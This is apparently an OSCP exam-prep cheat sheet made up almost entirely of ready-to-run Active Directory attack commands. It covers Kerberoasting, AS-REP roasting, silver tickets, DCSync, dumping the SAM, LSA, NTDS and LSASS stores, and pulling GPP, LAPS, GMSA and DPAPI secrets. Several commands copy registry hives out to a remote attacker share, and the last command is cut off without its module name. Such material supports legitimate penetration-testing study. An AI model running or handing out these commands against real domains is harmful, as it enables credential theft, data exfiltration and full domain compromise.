# Active-Directory for OSCP

## Enumerate with Bloodhound 

*  From Kali

```bash
bloodhound-python -d 'oscp.exam' -u 'user' -p 'password' -ns $IP -dc dc.oscp.exam -c all --zip
```

* From Windows 

```
SharpHound.exe --collectionmethods All
```

## Pivoting

* With Ligolo-ng on agent run

```powershell
.\agent.exe -connect tun0:11601 -ignore-cert
```

* With proxy

```bash
sudo ip tuntap add user rzgami mode tun ligolo
```

```bash
sudo ip link set ligolo up
```

```bash
./proxy -selfcert

```

* Once the agent connection is received do

```bash
sessions
```

```bash
ifconfig
```

```bash
sudo ip route add 10.10.x.x/24 dev ligolo
```

```bash
start
```


## AS-REP Roasting

* Get Users via `ridbrute` or `kerbrute`

```bash
./kerbrute userenum smb/users.txt -d oscp.exam --dc WIN-EIEE02645O1.oscp.exam
```

* via `Get-NPusers`

```bash
impacket-GetNPUsers -dc-ip $IP oscp.exam/ -no-pass -usersfile users.txt
```

* with user login

```bash
impacket-GetNPUsers -dc-ip $IP oscp.exam/john
```

* With Rubeus

```powershell
Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
```

* With nxc

```bash
nxc ldap $IP -u users.txt -p '' --asreproast output.txt
```

```bash
nxc ldap $IP -u user -p password --asreproast output.txt
```

* Crack the Hash

```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoasting

* via GetUserSPNs

```bash
impacket-GetUserSPNs -dc-ip lusdc.lustrous.vl  oscp.exam/john.doe:jane:doe -request
```

* via Rubeus

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt
```

* via nxc

```bash
nxc ldap $IP -u user -p passwd --kerberoasting kerberoast.txt --kdchost dc01.oscp.exam
```

* Targeted Kerberoast

```bash
python3 targetedKerberoast.py -v -d ms01.oscp.exam -u John.Doe -p 'jane.doe'
```

* Crack the Hashes

```bash
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Silver Tickets

* With Impacket scripts

```bash
impacket-lookupsid user:password@$IP
```

```bash
impacket-ticketer -nthash "69596C7AA1E8DAEE17F8E78870E25A5C" -domain-sid "S-1-5-21-2330692793-3312915120-706255856" -domain "breach.vl" -spn "MSSQLSvc/dc.oscp.exam:1433" "administrator"
```

* with Mimikatz

```powershell
privilege::debug
kerberos::golden /domain:OSCP /sid:S-1-5-21-2330692793-3312915120-706255856 /user:administrator /target:dc.oscp.exam /service:mssql /rc4:NTHASH /ptt

```
## DC-Sync

* Via secretsdump

```bash
impacket-secretsdump oscp.exam/admin:@dc.oscp.exam -hashes :nthash
```

* via nxc

```bash
nxc smb $IP -u Administrator -H 'hash' --ntds --user domadmin
```

* via mimi (always run `privilege::debug` before executing anything)

```powershell
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:domadmin
```

```powershell
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /all /csv
```

## SAM and LSA 

* If the user is in backup-operators we can do

```bash
impacket-smbserver -smb2support "share" .
```

*  Saving each Hive manually 

```bash
impacket-reg domain/user:password@dc.oscp.exam save -KeyName 'HKLM\SECURITY' -o '\\tun0\share'
```

```bash
impacket-reg domain/user:password@dc.oscp.exam save -KeyName 'HKLM\SAM' -o '\\tun0\share'
```

```bash
impacket-reg domain/user:password@dc.oscp.exam save -KeyName 'HKLM\SECURITY' -o '\\tun0\share'
```

* Backup all at once

```bash
impacket-reg domain/user:password@dc.oscp.exam backup -o '\\tun0\share'
```

* In Windows (check for old saves like windows.old or win32\old\)
```powershell
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
```

```powershell
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
```

```powershell
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

* using [BackupOperatortoDA](https://github.com/mpgn/BackupOperatorToDA)

```powershell
BackupOperatorToDA.exe -d "oscp.exam" -u "user" -p "password" -t "$IP" -o "\\tun0\share"
```

* Using Mimikatz

```powershell
privilege::debug
lsadump::sam
lsadump::secrets
```

* Using nxc

```bash
nxc smb $IP -u user -p password --sam/ --lsa
```

* Offline crack with secretsdump

```bash
impacket-secretsdump -sam SAM.save  -system SYSTEM.save -security SECURITY.save LOCAL
```

* Remote Dumping of Hashes

```bash
impacket-secretsdump oscp.exam/user:password@target
```

```bash
impacket-secretsdump oscp.exam/user:@target -hashes ':nthash'
```

```bash
impacket-secretsdump oscp.exam/user:@target -k -no-pass
```

## NTDS secrets


* Diskshadow and robocopy via SeBackupPrivielges

* script 1
```powershell
set verbose on  
set metadata C:\Windows\Temp\meta.cab  
set context clientaccessible  
set context persistent  
begin backup  
add volume C: alias cdrive  
create  
expose %cdrive% E:  
end backup
```

```powershell
diskshadow /s back_script.txt
```

```powershell
cd E:
```

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

```powershell
reg save hklm\system c:\temp\system.bak
```

```powershell
download ntds.dit  
download system
```

```bash
impacket-secretsdump -ntds ntds.dit -system system
```

*  script 2
```
set context persistent nowriters
set metadata c:\exfil\metadata.cab
set verbose on
add volume c: alias trophy
create
expose %df% z:
```

```
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

```
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

* [privesc-with-sebackup](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
* [iredteam](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
* [0xdf](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#diskshadow)

* nxc 

```bash
nxc smb $IP -u user -p password --ntds
```


## LSASS

* kali
```
pypykatz lsa minidump lsass.dmp > lsass.txt
```

* nxc
```bash
nxc smb $IP -u username -p password -M lsassy
```

* mimikatz

```powershell
privilege::debug
sekurlsa::logonpasswords
```

## GPP

* nxc

```bash
nxc smb $IP -u user -p password -M gpp_password
```

## GMSA

* nxc

```bash
nxc smb $IP -u user -p password --gmsa
``` 

## LAPS

* nxc
```bash
nxc ldap $IP -u user -p password -M laps
```

## ADCS

```bash
nxc ldap $IP -u user -p password -M adcs
```

## DPAPI

```bash
nxc smb $IP -u user -p password --dpapi
```

## NXC for vulns

* check for zerologon

```bash
nxc smb $IP -u username -p password -M zerologon
```

* check for potato

```bash
nxc smb $IP -u username -p password -M petitpotam
```

* check for nopac

```bash
nxc smb $IP -u username -p password -M nopac
```

* webdav exploit

```bash
nxc smb $IP -u username -p password -M
```